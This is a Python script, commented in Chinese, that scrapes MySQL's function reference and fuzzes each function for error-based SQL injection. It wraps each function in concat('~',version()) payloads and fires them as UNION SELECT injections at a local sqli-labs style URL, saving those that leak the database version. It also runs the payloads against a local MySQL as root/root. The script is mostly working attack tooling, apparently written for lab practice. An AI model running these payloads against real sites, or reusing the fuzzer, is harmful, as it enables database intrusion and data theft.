import requests
from bs4 import BeautifulSoup
import os
import re
import pymysql


def writefile(filename, payload):
    '''
    写入一个指定名字的文件用于存储数据
    :param filename:给出文件的名称
    :param payload:给出需要进行写入的数据
    '''
    # 使用单独的open写入文件，然后手动的关闭
    f = open(file=f'{filename}.txt', mode='a+')
    f.write(payload + '\n')
    f.close()


def sql_reptile():
    '''
    这里直接获取mysql官网的sql语句，并且存入文件
    '''
    urls = [
        r'https://dev.mysql.com/doc/refman/8.0/en/built-in-function-reference.html',
        r'https://dev.mysql.com/doc/refman/8.0/en/loadable-function-reference.html'
    ]
    # 简单的反爬策略
    heads = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'referer': 'https://dev.mysql.com/doc/refman/8.0/en/loadable-function-reference.html',
    }
    # 检测爬虫函数的文件是否存在如果存在就删除
    if os.path.exists('sqlfunction.txt'):
        os.remove('sqlfunction.txt')
    # 爬取数据
    for i in urls:
        try:
            res = requests.get(url=i, headers=heads)
            text = res.text
            res.close()
            # 数据清洗
            soup = BeautifulSoup(text, 'lxml')
            date_list = soup.find_all(name='code')
            lists = []
            for j in date_list:
                # 对数据中的其他多余符号进行清洗方便拼接url
                temp = re.findall(r'>.*?<', str(j))
                temp = str(temp).replace("['>", '')
                temp = str(temp).replace("<']", '')
                temp = str(temp).replace("()", '')
                temp = str(temp).replace(";", '')
                writefile(filename='sqlfunction', payload=temp)
        except Exception as e:
            pass
    print('已经爬取了所有的sql函数')


def poc_function(date):
    #     因为在本地测试。所以不需要用反爬
    payload = [
        rf'{date}(1,concat("~",version()))',
        rf'{date}(concat("~",version()),1)',
        rf'{date}(concat("~",version()),1,1)',
        rf'{date}(1,concat("~",version()),1)',
        rf'{date}(1,1,concat("~",version()))',
        rf'{date}(version())',
        rf'{date}(version(),1)',
        rf'{date}(1,version())',
        rf'{date}(version(),1,1)',
        rf'{date}(1,version(),1)',
        rf'{date}(1,1,version())',
        # 字符串的payload
        rf'{date}("1",concat("~",version()))',
        rf'{date}(concat("~",version()),"1")',
        rf'{date}(concat("~",version()),"1","1")',
        rf'{date}("1",concat("~",version()),"1")',
        rf'{date}("1","1",concat("~",version()))',
        rf'{date}(version())',
        rf'{date}(version(),"1")',
        rf'{date}("1",version())',
        rf'{date}(version(),"1","1")',
        rf'{date}("1",version(),"1")',
        rf'{date}("1","1",version())',
    ]
    # 固定的url进行测试操作
    # urls =rf'http://sqlss.sql/Less-2/?id=1 union select extractvalue(1,concat("~",version()))-- +a'
    for i in payload:
        try:
            urls = rf"http://sqlss.sql/Less-2/?id=1 union select {i},1,2-- +a"
            res = requests.get(url=urls)
            text = res.text
            res.close()
            if re.findall(r"8\.0\.12", text):
                # 写入可以执行的payload到文件中
                writefile(filename='payload', payload=urls)
                print('已经写入可用的函数')
        except Exception as e:
            pass


def mysql_test(payload):
    '''
    传入并且链接到数据库进行报错函数的实验操作
    :param payload:传入的读取的payload
    '''
    # 创建mysql 的链接
    db = pymysql.connect(
        host='127.0.0.1',
        user='root',
        password='root',
        database='test1'
    )
    #     创建游标对象
    cursor = db.cursor()
    # 创建payload
    payload = [
        rf'{payload}(1,concat("~",version(),"~"))',
        rf'{payload}(concat("~",version(),"~"),1)',
        rf'{payload}(concat("~",version(),"~"),1,1)',
        rf'{payload}(1,concat("~",version()),1)',
        rf'{payload}(1,1,concat("~",version()))',
        rf'{payload}(version())',
        rf'{payload}(version(),1)',
        rf'{payload}(1,version())',
        rf'{payload}(version(),1,1)',
        rf'{payload}(1,version(),1)',
        rf'{payload}(1,1,version())',
        # 字符串的payload
        rf'{payload}("1",concat("~",version()))',
        rf'{payload}(concat("~",version()),"1")',
        rf'{payload}(concat("~",version()),"1","1")',
        rf'{payload}("1",concat("~",version()),"1")',
        rf'{payload}("1","1",concat("~",version()))',
        rf'{payload}(version())',
        rf'{payload}(version(),"1")',
        rf'{payload}("1",version())',
        rf'{payload}(version(),"1","1")',
        rf'{payload}("1",version(),"1")',
        rf'{payload}("1","1",version())',
    ]
    table_name = 'user1'
    for i in payload:
        # 组装sql语句
        sql = rf"select {i};"
        try:
            # 执行sql语句
            cursor.execute(sql)
        except Exception as e:
            if '8.0.12' in str(e):
                print(sql)
                writefile(filename='mysql', payload=sql)



if __name__ == '__main__':
    # 获取myql函数
    sql_reptile()
    # 检测payload文件是否存在如果存在就删除
    if os.path.exists('payload.txt'):
        os.remove('payload.txt')
    if os.path.exists('mysql.txt'):
        os.remove('mysql.txt')
    f = open('sqlfunction.txt', 'r')
    for i in f:
        try:
            i = str(i).replace('\n', '')
            # poc_function(i)
            mysql_test(i)
        except Exception as e:
            pass

    f.close()
    print('完成所有payload写入')
